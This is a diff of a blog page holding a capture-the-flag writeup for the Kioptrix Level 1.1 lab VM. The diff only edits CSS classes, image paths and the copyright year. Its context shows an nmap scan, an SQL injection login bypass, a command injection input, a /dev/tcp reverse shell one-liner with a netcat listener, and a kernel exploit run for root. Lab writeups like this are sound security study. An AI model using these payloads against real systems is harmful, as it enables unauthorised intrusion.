@@ -106,7 +106,7 @@
 
 <p>As always I started to enumerate with nmap:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Syrion:~ syrion$ nmap -sT -sV -p 1-65535 192.168.1.26
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Syrion:~ syrion$ nmap -sT -sV -p 1-65535 192.168.1.26
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-07 00:18 CET
 Nmap scan report for 192.168.1.26
 Host is up (0.0014s latency).
@@ -123,29 +123,29 @@ PORT     STATE SERVICE  VERSION
 
 <p>On port 80 there was this vulnerable login:</p>
 
-<p><img src="/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img1.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-07-kioptrix-level-1-1-writeup/img1.png" alt="Screenshot" /></p>
 
 <p>By using ‘ or 1=1 — – as username I successfully logged in:</p>
 
-<p><img src="/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img2.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-07-kioptrix-level-1-1-writeup/img2.png" alt="Screenshot" /></p>
 
 <p>There was this “Basic Administrative Web Console”.  By giving an ip address, it performed a ping command:</p>
 
-<p><img src="/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img3.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-07-kioptrix-level-1-1-writeup/img3.png" alt="Screenshot" /></p>
 
 <p>Nice!!! It looked like a Command Injection Vulnerability!!! I succesfully executed a “ls” command by using this input:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;ls
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;ls
 </code></pre></div></div>
 
-<p><img src="/images/posts/2017/2017-01-07-kioptrix-level-1-1-writeup/img4.png" alt="Screenshot" /></p>
+<p><img src="/images/2017-01-07-kioptrix-level-1-1-writeup/img4.png" alt="Screenshot" /></p>
 
 <p>I opened a reverse shell:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;bash -i &gt;&amp; /dev/tcp/192.168.1.24/4444 0&gt;&amp;1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>;bash -i &gt;&amp; /dev/tcp/192.168.1.24/4444 0&gt;&amp;1
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Syrion:~ syrion$ nc -l 4444
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Syrion:~ syrion$ nc -l 4444
 bash: no job control in this shell
 bash-3.00$ id
 uid=48(apache) gid=48(apache) groups=48(apache)
@@ -155,7 +155,7 @@ Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 
 
 <p>I noticed that this linux kernel version was vulnerable to this <a href="https://www.exploit-db.com/exploits/9542/">exploit</a>:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.00$ gcc exp.c -o exp
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-3.00$ gcc exp.c -o exp
 bash-3.00$ ./exp
 sh: no job control in this shell
 sh-3.00# id
@@ -206,7 +206,7 @@ uid=0(root) gid=0(root) groups=48(apache)
         <div class="row">
   <div class="col-lg-8 col-lg-offset-2">
     <footer>
-      Syrion © 2018 
+      Syrion © 2020 
     </footer>
   </div>
 </div>
